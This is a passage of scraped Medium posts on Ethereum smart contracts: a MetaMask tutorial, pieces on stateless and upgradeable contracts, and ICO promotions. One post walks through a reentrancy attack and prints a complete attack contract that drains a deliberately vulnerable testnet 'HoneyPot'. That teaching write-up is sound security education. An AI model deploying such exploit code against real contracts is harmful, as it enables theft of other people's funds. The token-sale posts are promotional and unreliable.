\u90fd\u9084\u5728\u975e\u5e38\u65e9\u671f\u7684\u767c\u5c55\uff0c\u8aaa\u4e0d\u5b9a\u73fe\u5728\u767c\u73fe\u7684\u554f\u984c\u6bd4\u89e3\u6c7a\u7684\u554f\u984c\u9084\u8981\u591a\uff08\u7b11\uff09\u3002\u6211\u4e0d\u89ba\u5f97\u5340\u584a\u93c8\u662f\u9280\u5f48\uff0c\u7a81\u7136\u4e4b\u9593\u5c31\u53ef\u4ee5\u89e3\u6c7a\u4ee5\u5f80\u9f90\u5927\u8907\u96dc\u7684\u554f\u984c\u3002\u4e0d\u904e\u6211\u771f\u7684\u5f88\u671f\u5f85\u53bb\u4e2d\u5fc3\u5316\u7684\u601d\u7dad\u53ef\u4ee5\u56de\u982d\u4f86\u601d\u8003\u6211\u5011\u5df2\u7d93\u505a\u904e\u7684\u670d\u52d9\uff0c\u6709\u54ea\u4e9b\u53ef\u4ee5\u518d\u900f\u904e\u53bb\u4e2d\u5fc3\u5316\u67b6\u69cb\uff0c\u63d0\u51fa\u65b0\u7684\u89e3\u6c7a\u65b9\u6848\u3002\u5982\u679c\u4f60\u5c0d Ethereum \u5340\u584a\u93c8\u6709\u8208\u8da3\uff0c\u4e0d\u59a8\u4f86\u53c3\u52a0 Taipei Ethereum Meetup\uff0c\u9019\u662f\u4e00\u500b\u8a0e\u8ad6 Ethereum \u5340\u584a\u93c8\u7684\u6280\u8853\u793e\u7fa4\u3002\u6211\u5011\u6bcf\u500b\u6708\u6703\u6709\u4e00\u6b21\u5230\u5169\u6b21\u7684\u6280\u8853\u5206\u4eab\uff0c\u6b61\u8fce\u5927\u5bb6\u4e00\u8d77\u4f86\u7814\u7a76\u53bb\u4e2d\u5fc3\u5316\u7684\u4e16\u754c\uff01", "responses": "6"}, {"title": "Calling a Smart Contract With a\u00a0Button", "author_name": "Dan Finlay", "link": "https://medium.com/metamask/calling-a-smart-contract-with-a-button-d278b1e76705?source=search_post", "post_date": "Apr 19, 2017", "readtime": "4 min read", "upvotes": "1.4K", "content": "Calling a Smart Contract With a\u00a0ButtonDan FinlayBlockedUnblockFollowFollowingApr 19, 2017Someone asked today how to call a smart contract with a button, and I didn\u2019t know where to send them, so I decided to write this really quickly.In this post I\u2019m going to give a simple but hopefully effective demonstration of how a JavaScript developer would create a web page that is able to call a smart contract, and send money (Ether) to it, with a single click.To do this, your users are going to need to be using a web3-enabled browser, so either an installable one like Parity or Mist, or they could use a browser extension like MetaMask.An introductory explanation of how MetaMask works, for developers.Also, while I could teach you how to use the web3 API directly, instead I\u2019m going to teach you how to use a new convenience library for talking to Ethereum smart contracts called EthJS.Your website will need to wait for the ready event, and then check for a global web3 object. That looks like this:window.addEventListener('load', function() {  // Check if Web3 has been injected by the browser:  if (typeof web3 !== 'undefined') {    // You have a web3 browser! Continue below!    startApp(web3);  } else {     // Warn the user that they need to get a web3 browser     // Or install MetaMask, maybe with a nice graphic.  }})Copied loosely from the MetaMask Developer Guide.Here\u2019s a nice graphic you can use if they don\u2019t have web3 available.In this example, I\u2019m going to assume you\u2019re using a JavaScript bundler like Browserify or Webpack, and know how to install modules off NPM.In your app setup, you\u2019re going to use a few different ethjs modules, and you\u2019ll initialize them with the global web3 object\u2019s currentProvider property, which is how it talks to the blockchain anyway.const Eth = require('ethjs-query')const EthContract = require('ethjs-contract')function startApp(web3) {  const eth = new Eth(web3.currentProvider)  const contract = new EthContract(eth)  initContract(contract)}Once you\u2019ve instantiated a contract instance, you can use it to create references to live contracts on the network. To do this, you need two things:The contract address.The contract ABI.The ABI is the Application Binary Interface, and it tells your JavaScript contract how to talk to the smart contract. It\u2019s just JSON data that describes the contract methods.Usually if you published a contract, you know how to get the ABI, and if you\u2019re connecting to someone else\u2019s contract, they should make the ABI available, although sometimes you can find ABIs matched to contracts on block explorers like Etherscan.Let\u2019s assume you have your ABI and address available, and see how we\u2019ll create a contract object now. In this example I\u2019ll use an ABI that includes only the transfer(to, value) method from the Token standard:const abi = [{    \"constant\": false,    \"inputs\": [      {        \"name\": \"_to\",        \"type\": \"address\"      },      {        \"name\": \"_value\",        \"type\": \"uint256\"      }    ],    \"name\": \"transfer\",    \"outputs\": [      {        \"name\": \"success\",        \"type\": \"bool\"      }    ],    \"payable\": false,    \"type\": \"function\"  }]const address = '0xdeadbeef123456789000000000000'function initContract (contract) {  const MiniToken = contract(abi)  const miniToken = MiniToken.at(address)  listenForClicks(miniToken)}Now we\u2019ve initialized a JavaScript interface for a smart contract, so we just need to create a little HTML<button class=\"transferFunds\">Send Money!</button>And a little JavaScript to respond to the click, and send those funds:function listenForClicks (miniToken) {  var button = document.querySelector('button.transferFunds')  button.addEventListener('click', function() {    miniToken.transfer(toAddress, value, { from: addr })    .then(function (txHash) {      console.log('Transaction sent')      console.dir(txHash)      waitForTxToBeMined(txHash)    })    .catch(console.error)  })}Note if this transaction were to send ether also, you\u2019d add value: '10000' to the options hash that includes the from field. The value is in the unit of wei, which is 1x10^-18 Ether. An easy way to convert is like this:var inWei = web3.toWei('10', 'ether')A strange part of this for a normal web developer is that the transaction response does not mean the transaction is now complete, it just means it\u2019s been transmitted to the network. It still needs to be mined, and in Ethereum, that takes around 14 seconds on average (block time, view stats on EthStats.net).Right now there aren\u2019t great subscription methods for waiting for a transaction to be mined, so you\u2019ll need to poll for it with that txHash you got back. Yes, it\u2019s tedious, so I\u2019ll show you how it can be a little less painful using the new JavaScript async/await pattern:async function waitForTxToBeMined (txHash) {  let txReceipt  while (!txReceipt) {    try {      txReceipt = await eth.getTransactionReceipt(txHash)    } catch (err) {      return indicateFailure(err)    }  }  indicateSuccess()}That\u2019s it! (I know, it was a lot) I hope this was enough to show you how to interact with a smart contract over the Ethereum block chain. Once you\u2019re used to it, it\u2019s pretty great, because it\u2019s a sort of global API that has permissions baked in, so while you have to do a couple funny things like wait for transactions to be mined, you don\u2019t have to do obnoxious things like manage user accounts and passwords, or manage a backend server yourself!Please add any questions you have here, we made MetaMask to enable the easy creation of web interfaces for smart contracts, so that\u2019s really what we\u2019re here for. Show us what you\u2019ve got!", "responses": "12"}, {"title": "The ultimate guide to audit a Smart Contract + Most dangerous attacks in\u00a0Solidity", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/ethereum-developers/how-to-audit-a-smart-contract-most-dangerous-attacks-in-solidity-ae402a7e7868?source=search_post", "post_date": "Sep 17, 2017", "readtime": "12 min read", "upvotes": "1.6K", "content": "The ultimate guide to audit a Smart Contract + Most dangerous attacks in\u00a0SolidityMerunas GrincalaitisBlockedUnblockFollowFollowingSep 17, 2017Have you ever wondered how to audit a Smart Contract to find security breaches?You can learn it by yourself or you can use this handy step-by-step guide to know exactly what to do at what moment and audit those contract.I\u2019ve been researching several Smart Contract audits and I\u2019ve learn the most common steps they took to extract all the essential information from any contract.You\u2019ll learn the following:Steps to take in order to fully audit a Smart Contract to generate a pdf with all the findings.The most important types of attacks that you need to know as an Ethereum Smart Contract Auditor.What to look for in a contract and useful tips that you won\u2019t find anywhere else but here.Let\u2019s get right to it and start auditing contracts:", "responses": "9"}, {"title": "Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack\u00a0Contract", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4?source=search_post", "post_date": "May 25, 2017", "readtime": "4 min read", "upvotes": "1.2K", "content": "Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack\u00a0ContractGustavo (Gus) GuimaraesBlockedUnblockFollowFollowingMay 25, 2017To code smart contracts is certainly not a free picnic. A bug introduced in the code cost money and most likely not only your money but also other people\u2019s as well. The reality is that the Ethereum ecosystem is still in its infancy but growing and standards are being defined and redefined by the day so one need to be always updated and akin to smart contract security best practices.As a student of smart contract security, I have been on the look out for vulnerabilities in code. Recently the educators at Team B9lab informed me of this contract deployed to the testnet.pragma solidity ^0.4.8;contract HoneyPot {  mapping (address => uint) public balances;  function HoneyPot() payable {    put();  }  function put() payable {    balances[msg.sender] = msg.value;  }  function get() {    if (!msg.sender.call.value(balances[msg.sender])()) {      throw;    }      balances[msg.sender] = 0;  }  function() {    throw;  }}The HoneyPot contract above originally contained 5 ether and was deliberately devised to be hacked. In this blog post I want to share with you how I attacked this contract and \u2018collected\u2019 most of its ether.The Vulnerable ContractThe purpose of the HoneyPot contract above is to keep a record of balances for each address that put() ether in it and allow these addresses to get() them later.Let\u2019s look at the most interesting parts of this contract:mapping (address => uint) public balances;The code above maps addresses to a value and store it in a public variable called balances\u00a0. It allows to check the HoneyPot balance for a address.balances[0x675dbd6a9c17E15459eD31ADBc8d071A78B0BF60]The put() function below is where the storage of the ether value happens in the contract. Note that msg.sender here is the address from the sender of the transaction.function put() payable {    balances[msg.sender] = msg.value;  }This next function we find where the exploitable is. The purpose of this function is to let addresses to withdraw the value of ether they have in the HoneyPot balances.function get() {    if (!msg.sender.call.value(balances[msg.sender])()) {      throw;    }      balances[msg.sender] = 0;  }Where is the exploitable and how can someone attack this you ask? Check again these lines of code out:if (!msg.sender.call.value(balances[msg.sender])()) {      throw;}balances[msg.sender] = 0;HoneyPot contract sets the value of the address balance to zero only after checking if sending ether to msg.sender goes through.What if there is an AttackContract that tricks HoneyPot into thinking that it still has ether to withdraw before AttackContract balance is set to zero. This can be done in a recursive manner and the name for this is called reentrancy attack.Let\u2019s create one.Here is the full contract code. I will attempt my best to explain its parts.pragma solidity ^0.4.8;import \"./HoneyPot.sol\";contract HoneyPotCollect {  HoneyPot public honeypot;  function HoneyPotCollect (address _honeypot) {    honeypot = HoneyPot(_honeypot);  }  function kill () {    suicide(msg.sender);  }  function collect() payable {    honeypot.put.value(msg.value)();    honeypot.get();  }  function () payable {    if (honeypot.balance >= msg.value) {      honeypot.get();    }  }}The first few lines is basically assigning the solidity compiler to use with the contract. Then we import the HoneyPot contract which I put in a separate file. Note that HoneyPot is referenced throughout the HoneyPotCollect contract. And we set up the contract base which we call it HoneyPotCollect\u00a0.pragma solidity ^0.4.8;import \"./HoneyPot.sol\";contract HoneyPotCollect {  HoneyPot public honeypot;...}Then we define the constructor function. This is the function that is called when HoneyPotCollect is created. Note that we pass an address to this function. This address will be the HoneyPot contract address.function HoneyPotCollect (address _honeypot) {    honeypot = HoneyPot(_honeypot);}Next function is a kill function. I want to withdraw ether from the HoneyPot contract to the HoneyPotCollect contract. However I want also to get the collected ether to an address I own. So I add a mechanism to destroy the HoneyPotCollect and send all ether containing in it to the address that calls the kill function.function kill () {  suicide(msg.sender);}The following function is the one that will set the reentrancy attack in motion. It puts some ether in HoneyPot and right after it gets it.function collect() payable {    honeypot.put.value(msg.value)();    honeypot.get();  }The payable term here tells the Ethereum Virtual Machine that it permits to receive ether. Invoke this function with also some ether.The last function is what is known as the fallback function. This unnamed function is called whenever the HoneyPotCollect contract receives ether.function () payable {    if (honeypot.balance >= msg.value) {      honeypot.get();    }  }This is where the reentrancy attack occur. Let\u2019s see how.The AttackAfter deploying HoneyPotCollect, call collect() and sending with it some ether.HoneyPot get() function sends ether to the address that called it only if this contract has any ether as balance. When HoneyPot sends ether to HoneyPotCollect the fallback function is triggered. If the HoneyPot balance is more than the value that it was sent to, the fallback function calls get() function once again and the cycle repeats.Recall that within the get()function the code that sets the balance to zero comes only after sending the transaction. This tricks the HoneyPot contract into sending money to the HoneyPotCollect address over and over and over until HoneyPot is depleted of almost all its ether.Try it yourself. I left 1 test ether in this contract so others could try it themselves. If you see no ether left there, then it is because someone already attacked it before you.I originally created this code for the HoneyPotAttackusing the Truffle framework. Here is the code in case you need it for reference. Enjoy!", "responses": "9"}, {"title": "Stateless Smart Contracts", "author_name": "James Childs-Maidment", "link": "https://medium.com/@childsmaidment/stateless-smart-contracts-21830b0cd1b6?source=search_post", "post_date": "Aug 16, 2017", "readtime": "4 min read", "upvotes": "1K", "content": "Stateless Smart ContractsJames Childs-MaidmentBlockedUnblockFollowFollowingAug 16, 2017The stateless smart contract or dumb contract is a design pattern used to drastically reduce the gas cost of Ethereum smart contracts.A stateless design comes in two parts:The Dumb ContractThe FilterDumb ContractHere is how you might write a standard datastore contract:contract DataStore {    mapping(address => mapping(bytes32 => string)) public store;        event Save(address indexed from, bytes32 indexed key, string value);        function save(bytes32 key, string value) {        store[msg.sender][key] = value;        Save(msg.sender, key, value);    }}Let\u2019s say we want to save the following key / value pair using the contract above:key: \u201cethereum\u201dvalue: \u201cEthereum is a decentralized platform that runs smart contracts: applications that run exactly as programmed without any possibility of downtime, censorship, fraud or third party interference.\u201dThis transaction will cost 181,181 gas (or 89,797 gas if we use IPFS).If we follow a stateless design our contract would look like this:contract DataStore {    function save(bytes32 key, string value) {}}That\u2019s it. We don\u2019t store any contract state and we don\u2019t fire off events. We implement the rest of the logic off-chain. If we use the same data as above the transaction costs 35,721 gas (or 25,841 gas if we use IPFS) which is an 80% reduction in gas cost.So if we aren\u2019t saving any contract state how do we access our data?Take a look at this transaction on Etherscan, scroll down to Input Data, and click the Convert To Ascii button. Our data lives in the input of the transaction.FilterA Filter processes the transactions of a dumb contract and provides an interpretation of that data.In a standard dapp we would interact with a smart contract like this:Frontend => Web3 => Ethereum Network => Web3 => FrontendIn a stateless design we do the following:Frontend => Web3 => Ethereum Network => Backend => FrontendWhen a user interacts with our dumb contract from the frontend (using something like MetaMask) we watch for incoming transactions on the backend and process them.For example, using the information in the transaction above, we can implement the logic from the standard version of the datastore contract off-chain.We can use InputDataDecoder to recover information from the transaction inputs:const abi = [  {    constant: false,    inputs: [      { name: \"key\", type: \"bytes32\" },      { name: \"value\", type: \"string\" }    ],    name: \"save\",    outputs: [],    payable: false,    type: \"function\"  }];const decoder = new InputDataDecoder(abi);const decodeInput = input => decoder.decodeData(input);We need to do a little extra processing to recover our bytes32 key arg:const processArgs = input =>  input.inputs.map((arg, i) => {    const type = input.types[i];    if (type === \"string\") {      return arg;    }    if (type === \"bytes32\") {      const toHex = `0x${arg.toString(\"hex\")}`;      return web3.toUtf8(toHex);    }    return arg;  });Tying it all together:const run = async () => {  const tx = \"0xc9fdf51d...\";  const transaction = await web3.eth.getTransaction(tx);  const input = decodeInput(transaction.input);  if (input.name === \"save\") {    const args = processArgs(input);    const address = transaction.from;    const key = args[0];    const value = args[1];    // save the address / key / value to a database  }};We can now save the key / value under the address that the transaction was sent from in a database that provides a better user experience.Extras DetailsYou can apply various levels of statelessness to your contract depending on your needs. For example, you can store usernames in a registry to enable other smart contracts to identify users.function registerUsername(bytes32 username) external {        var hasUsername = usernames[msg.sender];        var isOwned = addresses[username];        if (isOwned != 0) throw; // prevents registration of existing username        if (hasUsername != 0) throw; // prevents registered address from registering another username        if (!isLowercase(username)) throw; // username must be lowercase        usernames[msg.sender] = username;        addresses[username] = msg.sender;    }Meanwhile, you can keep other content completely stateless.function post(string data) external {  var username = usernames[msg.sender];  if (username == 0) throw; // user must be registered}TamperingUsers can easily validate whether or not a Filter provider is tampering with content by looking at the inputs of transactions on the blockchain.However, tampering can be positive! A Filter can enhance stateless content with metadata, media, links, and handles.One of the great things about dumb contracts is that anyone can build a Filter on top of one and provide their own interpretation of the data. If you are worried about censorship you can also open source your Filter to allow others to spin up your interpretation.Trade-OffsA stateless design is only useful for certain types of projects. Keep these trade-offs in mind:A stateless design requires a mix of decentralization and centralization to provide the best user experience / gas cost.Other contracts cannot access your data.If your contract has no events you must processes every block to find relevant transactions. This can be mitigated by firing off empty events with marginal extra gas costs.That\u2019s it, I hope you found this educational!", "responses": "12"}, {"title": "Ethereum Smart Contracts in Python: a comprehensive(ish) guide", "author_name": "Nick Williams", "link": "https://hackernoon.com/ethereum-smart-contracts-in-python-a-comprehensive-ish-guide-771b03990988?source=search_post", "post_date": "Apr 12, 2018", "readtime": "15 min read", "upvotes": "1.2K", "content": "Ethereum Smart Contracts in Python: a comprehensive(ish) guideNick WilliamsBlockedUnblockFollowFollowingApr 12, 2018It\u2019s one thing to get a basic smart contract up on Ethereum\u200a\u2014\u200ajust google \u201cERC20 Token Tutorial\u201d you\u2019ll find plenty of information on how to do it. Interacting with a contract programmatically is another thing entirely, and if you\u2019re a Python coder, then tutorials are scarce.One, by my count, and it\u2019s soooo\u00a02017.Fortunately for us, Version 4 of Web3.py has just been released, which means it\u2019s now easier than ever to run a python script and watch as magical things happen on the blockchain. Spooky.A big shout out Piper Merriam, Jason Carver and all the others who\u2019ve worked so on hard on Web3.py to make life easy for the rest of us\u200a\u2014\u200aat Sempo we\u2019re using Ethereum to make Disaster Response more transparent, and it\u2019s only really possible thanks to Web3.py.", "responses": "11"}, {"title": "Summary of Ethereum Upgradeable Smart Contract\u00a0R&D", "author_name": "Jack Tanner", "link": "https://blog.indorse.io/ethereum-upgradeable-smart-contract-strategies-456350d0557c?source=search_post", "post_date": "Mar 5, 2018", "readtime": "7 min read", "upvotes": "1.1K", "content": "Summary of Ethereum Upgradeable Smart Contract\u00a0R&DJack TannerBlockedUnblockFollowFollowingMar 5, 2018This article is a summary of research and development in the area of upgradeable Ethereum smart contracts. It is meant to be a convenient resource to centralise the research to date, and to continue this technical discussion. In addition, I have created a summary table of the pros and cons of different strategies that are being proposed. If you are working/watching this area of R&D please comment on this article as to your agreements, disagreements or opinions on this table and my descriptions of strategies.Other than my own contributions as part of the AvanceHub project several months ago, this article does not add new technical R&D. The ordering of the strategies in this articles should not be interpreted as their level of adoption or preference by myself or the developer community. As part of the indorse.io project, this article will begin our own formulation of an upgradeable strategy which we consider necessary.Update June 2018: indorse.io has continued to research and deployed contracts that use the proxy contract pattern.At the bottom can be found what I believe to be a comprehensive list of links of R&D to date.100% Upgradeable MechanismsCreating a smart contract that can be completely replaced with new logic is possible just by using more smart contract infrastructure. There are two main streams of strategies: proxies and the separation of logic and data into different contracts. Separating logic and data in a contract can be done in two ways.The fundamental problem that both methods solve is how to update a contract\u2019s logic while still retaining access to a contract\u2019s state.I have given a brief summary of how these strategies work below but I recommend going to the latest resources at the bottom of this article to become intimately familiar with how they work (especially if you are just starting down the rabbit hole of upgradeable contracts).Proxy ContractsA proxy contract uses the delegatecall opcode to forward function calls to a target contract which can be updated. As delegatecall retains the state of the function call, the target contract\u2019s logic can be updated and the state will remain in the proxy contract for the updated target contract\u2019s logic to use. As with delegatecall, the msg.sender will remain that of the caller of the proxy contract.Due to the recent Byzantine hard fork, which now gives access to the return size of a function call, this method can now be generic (compared to when it was first proposed by Nick Johnson). An example of a generic proxy contract can be seen in Daonomic\u2019s resources which is also is a great article to read about this mechanism in more detail to get a simple overview.Update June 2018: There are several ways to create an upgradeable contract using a proxy with delegate call. Zeppelin has a very good articles explaining the three patterns that they have researched and tested. The pattern that has been chosen for the ZeppelinOS smart contract system is called the Unstructured Storage pattern and has now gone through a full security audit by Nomic Labs. This audit identified one critical issue with the pattern which has now been fixed.Separate Logic and Data ContractsThis involves separating the smart contract into a data contract which contains the data (variables, structures, mappings etc) with appropriate getters and setters, and a logic contract which contains all of the business logic of how to update this data. The logic contract updates the data through the setters and the data contract only allows the logic contract to call the setters. This allows the logic to be replaced while keeping the data in the same place, allowing for a fully upgradeable system.The contract can be updated by pointing users to use the new logic contract (through a resolver such as ENS) and updating the data contract permissions to allow the new logic contract to be able to execute the setters.Check out @Thomas Wiesner\u2019s video to get a better understanding of this mechanism.Separate Logic and Data Contracts with Data as Key-Value pairsThis strategy works with a similar principle to the one above, except that instead of using the final desired data structures that your contract would normally use (structs, mappings etc), all data is abstracted down and stored in primitive key-value pairs. A standard naming system along with the sha256 hash algorithm is used to find the values of data.Check out David Rugendyke\u2019s article to get a better understanding of this mechanism.Partially Upgradeable StrategiesCreating a fully upgradeable contract sounds great but there is a large trust compromise required: the immutability of the contract. Using only partially upgradeable contract systems may make sense in many cases.In this strategy, core features of your smart contract can be left as non-upgradable. Other components that may be less-integral or more complex (and hence have high probability of requiring upgrade) are implemented with an upgradeable strategy.I have seen a few good examples of this but if you know of any more please let me know:The Ethereum Name Service \u201cENS\u201d: The core ENS contract is a very simple contract and cannot be changed. Domain registrars (eg for the\u201c.eth\u201d domain) however can be upgraded by administrators. The registrar for the \u201c.eth\u201d domain is a contract factory for Deed contracts which are created one per deed, so that if a new domain manager is used, it can be relinked with all previous deeds and their state without much hassle.The 0xProject: The 603 line core DEX (Decentralized exchange) smart contract can be fully upgraded while the proxy contracts (one for each user) remain the same. The 0x \u201cproxy\u201d contract (not the same as the proxy strategy mentioned above) contains the user funds and settings. For this reason it requires more trust and is not an upgradeable part of the 0x contract system.Other ChallengesIn all cases, a governance tradeoff is made that compromises the immutability of a smart contract. A strong governance strategy is also needed as part of an upgradeable strategy.Creating an opt-in upgradeable smart contract system is possible and valuable to users but adds complexity.Changes to Solidity compilers may break compatibility between new and old contracts.There are gas overheads to consider when formulating an upgradeable strategy.ConclusionNo one strategy is perfect and selecting the right strategy depends on the smart contract system to be implemented. All strategies are complex and smart contract designers should be very comfortable with their chosen upgradeable strategy to avoid security vulnerabilities.My opinionsTo create an upgradeable smart contract, the proxy mechanism seems the best well rounded strategy because it allows programmers to separate the upgradeable mechanism from their contract design and this makes things much easier to reason with and use, and will create less errors (which is a principal reason why we need upgradeable contracts in the first place).Update June 2018: The Unstructure Storage pattern that is in the final stages of being released as part of ZeppelinOS appears to be the most mature and tested pattern, and will likely be widely adopted.The use of a hybrid partially upgradeable strategy where the simplest, core logic is immutable also a good idea to maintain strong trust with users.Designing your non-upgradeable smart contract system first and then formulating an upgradeable strategy seems like a practical and ideal way to go about this.Twitter: @theblockstalkIndorse: indorse.ioResearch ReferencesGeneral2018\u201302\u201301 Zeppelin Solutions: Zeppelin and the Evolution of Smart Contract Development (Epicenter Youtube Video)2016\u20132017\u00a0: Upgradable Smart Contracts Stackexchange threadConsenSys: Ethereum Smart Contract Best PracticesEvoluchain: EvoluchainProxy Contracts2018\u201310\u201330 Nick Mudge: ERC Transparent Contract Standard #15382018\u201305\u201311 Nomic Labs: ZeppelinOS Smart Contract Audit2018\u201304\u201318 Zeppelin: Proxy Patterns2018\u201304\u201313 Zeppelin: Upgradeability using Unstructured Storage2018\u201302\u201322 Jorge Izquierdo: ERC DelegateProxy #8972018\u201302\u201315 Daonomic: Upgradeable Ethereum Smart Contracts, Github Project2018\u201301\u201311 Team B9lab: Upgradeable Github Project2018\u201301\u201310 Manuel Araoz\u00a0: Solidity-proxy Github Project2017\u201306\u201302 @Ownage\u00a0: Ether-routher Github Project2017\u201305\u201324 Nick Johnson: Mad blockchain science: A 100% upgradeable contract, Gist File2017\u201303\u201315 Jorge Izquierdo: Advanced Solidity code deployment techniques2017\u201303\u201307 Manuel Araoz: Proxy Libraries in Solidity2017\u201302\u201313 Jorge Izquierdo: Library Driven Development in Solidity2017\u201301\u201321 Tjaden Hess: Upgradeable smart contracts2016\u201306\u201316 @Martin Swende: Implicit method proxySeparate Logic and Data Contracts2017\u201312\u201309 @Thomas Wiesner: Upgrade Smart Contracts on Chain2017\u201311\u201313 Jack Tanner: Upgradeable, Github Project2017\u201308\u201321 Lukas K: Upgradable smart contracts. What we\u2019ve learned building Insurance on a Blockchain2016\u201308\u201316 @nikolai: Dapp-a-day 6: Upgradeable Tokens@monax: Solidity 1: The Five Types Model@monax: Solidity 7: Updating Solidity Contracts@Z.com Cloud Blockchain: Solution\u200a\u2014\u200aVersion Upgrade IssueSeparate Logic and Data Contracts with Data as Key-Value pairs2018\u201301\u201320 Hassan Abdel-Rahman: Upgradable Contracts in Solidity2017\u201311\u201322 David Rugendyke: Upgradable Solidity Contract Design, Github Project2017\u201306\u201329 Chandan Gupta: Interfaces make your Solidity contracts upgradeable, Github Project2016\u201306\u201308 Elena Dimitrova: Writing upgradable contracts in Solidity", "responses": "10"}, {"title": "The savedroid Smart\u00a0Contract", "author_name": "savedroid", "link": "https://medium.com/@savedroidapp/the-savedroid-smart-contract-cf8ce1f38334?source=search_post", "post_date": "Dec 23, 2017", "readtime": "", "upvotes": "", "content": "The savedroid Smart\u00a0ContractsavedroidBlockedUnblockFollowFollowingDec 23, 2017Miguel and Sebastian are our smart contract professionals.They will give you an overview of what they do and how the savedroid smart contract will look like.\ud83d\udcaaGive power to the people and join the revolution now! \ud83d\ude80", "responses": ""}, {"title": "Prototyping a Blockchain Smart\u00a0Contract", "author_name": "Abhishek Chakravarty", "link": "https://medium.com/@chakrvyuh/prototyping-a-blockchain-smart-contract-78877464e38e?source=search_post", "post_date": "Sep 27, 2017", "readtime": "12 min read", "upvotes": "1.3K", "content": "Prototyping a Blockchain Smart\u00a0ContractNotes on building and deploying a Smart Contract in\u00a0EthereumAbhishek ChakravartyBlockedUnblockFollowFollowingSep 27, 2017Photo by Mark Rabe on\u00a0UnsplashWelcome to Part 5 of the Product Manager\u2019s Guide to the blockchain series! If you somehow landed on my publication for the first time, Welcome! I recommend you start from part 1, and then read part 2 and part 3 and part 4 before reading this post. However if you already know what you are doing, by all means feel free to read on.", "responses": "21"}, {"title": "Smart Contract Testing & Ethereum Simulator", "author_name": "Amazingandyyy", "link": "https://medium.com/etherereum-salon/eth-testing-472c2f73b4c3?source=search_post", "post_date": "Aug 4, 2017", "readtime": "7 min read", "upvotes": "962", "content": "Smart Contract Testing & Ethereum SimulatorAmazingandyyyBlockedUnblockFollowFollowingAug 4, 2017In my last tutorial, I show Solidity programming language a bit and what it feels like to develop a simple HelloWorld smart contract. Today, I am talking about testing which is an important topic in development, especially for the smart contract development.All codes in this tutorial are available in this repoamazingandyyy/the-good-ethereum-smart-contract-tutorialthe-good-ethereum-smart-contract-tutorial - Repo for The Complete Ethereum Smart Contract Development tutorials series.github.com", "responses": "17"}, {"title": "Insights Network and Quantstamp Partner for Smart Contract Audit, INSTAR Airdrop, &\u00a0More\u2026", "author_name": "Insights Network (INSTAR)", "link": "https://medium.com/@InsightsNetwork/insights-network-and-quantstamp-partner-for-smart-contract-audit-instar-airdrop-more-1bde8625c0f0?source=search_post", "post_date": "Jan 22, 2018", "readtime": "3 min read", "upvotes": "1.4K", "content": "Insights Network and Quantstamp Partner for Smart Contract Audit, INSTAR Airdrop, &\u00a0More\u2026Insights Network (INSTAR)BlockedUnblockFollowFollowingJan 22, 2018Today, we at Insights Network are proud to announce an official partnership with Quantstamp!Why Insights \u2665\ufe0f QuantstampQuantstamp, Inc. is a company developing a protocol that aims to find vulnerabilities in smart contracts without a trusted third party. Quantstamp also offers centralized smart contract auditing services as their protocol is being developed.As many of you are aware, security issues amongst cryptocurrencies, such as the Parity Wallet hack, play a detrimental role in the mass adoption of cryptocurrencies by mainstream consumers. Quantstamp is leading the way in creating the conditions necessary for mainstream adoption and the use of smart contracts through their decentralized smart contract audit protocol and their world class team of smart contract experts providing hands-on audits.Securing blockchain networks to ensure scalability is at the top of the list when it comes to important work being conducted on Blockchain Technology\u200a\u2014\u200awhich is why the Insights Network is thrilled to be working with Quantstamp to ensure the integrity of our own work and provide transparency and a sense of security for our users.Quantstamp / Insights Audit DetailsOur partnership includes a full audit of the Insights Network crowdsale smart contract\u200a\u2014\u200ain addition to an audit of the Insights Network Blockchain Data Exchange smart contract on the EOS blockchain. This marks a ground breaking advancement for Quantstamp, as they continue to secure the Ethereum Network, while expanding their audit capabilities into other blockchains, such as EOS. The results of the Insights Network Blockchain Data Exchange smart contract on EOS will be announced at the time of the EOS main net launch.INSTAR Airdrop\u2014 Quantstamp Proof-of-Caring v2Insights Network will airdrop INSTAR Tokens for Quantstamp community members who actively participate in Quantstamp\u2019s Proof-of-Caring program.In total, 1.5% of all INSTAR Tokens (4.5MM Tokens) will be airdropped. The schedule for the Insights Network (INSTAR) airdrop is as follows:1.5MM INSTAR will be distributed at the end of the token sale.1.5MM INSTAR will be airdropped in May.1.5MM INSTAR will be airdropped in September.To register for the Quantstamp Proof-of-Caring v2 airdrop please visit this portal.Insights Network is committed to compliance; therefore, Quantstamp community members from the US, Canada and China are currently ineligible for these airdrops.It\u2019s our honor to work directly with Quantstamp as they secure the blockchain and we\u2019re delighted to be one of the very first projects selected to experience their next generation technology!Take a read of Quantstamp\u2019s official announcement of our partnership here: https://medium.com/quantstamp/quantstamp-to-audit-insights-networks-eos-smart-contracts-37581256026fLooking forward,Team InsightsTo learn more about Quantstamp\u200a\u2014\u200aclick hereTo learn more about Insights Network\u200a\u2014\u200aclick here", "responses": "2"}, {"title": "Bonus and Rewards Now Embedded in ERN\u2019s Smart\u00a0Contract", "author_name": "ERN Token Official", "link": "https://medium.com/@erntoken/bonus-and-rewards-now-embedded-in-erns-smart-contract-2fe172669767?source=search_post", "post_date": "Jun 5, 2018", "readtime": "", "upvotes": "3K", "content": "Bonus and Rewards Now Embedded in ERN\u2019s Smart\u00a0ContractERN Token OfficialBlockedUnblockFollowFollowingJun 5, 2018ICO participants, regardless of the number of tokens bought, will be qualified to earn Ethereum as a bonus. The bonus will automatically appear in user\u2019s ERC20 wallet and will be paid in ETH. As a proof that ERN will be true to its promise, we already put this code on ERN\u2019s smart contract. This is for the private sale and ICO:Exciting times ahead! Don\u2019t forget the dates of our ICO:Pre-sale start date: June 15, 2018Pre-sale end date: June 25, 2018Tokensale start date: June 25, 2018Tokensale end date: July 30, 2018To know more about our project, you can visit erntoken.io or read our white paper here.Follow us on our social media channels for more news:Twitter Facebook Reddit Instagram Telegram LinkedIn", "responses": ""}, {"title": "Deploying A Smart Contract, The Hard\u00a0Way", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://medium.com/@gus_tavo_guim/deploying-a-smart-contract-the-hard-way-8aae778d4f2a?source=search_post", "post_date": "May 9, 2017", "readtime": "4 min read", "upvotes": "1K", "content": "Deploying A Smart Contract, The Hard\u00a0WayGustavo (Gus) GuimaraesBlockedUnblockFollowFollowingMay 9, 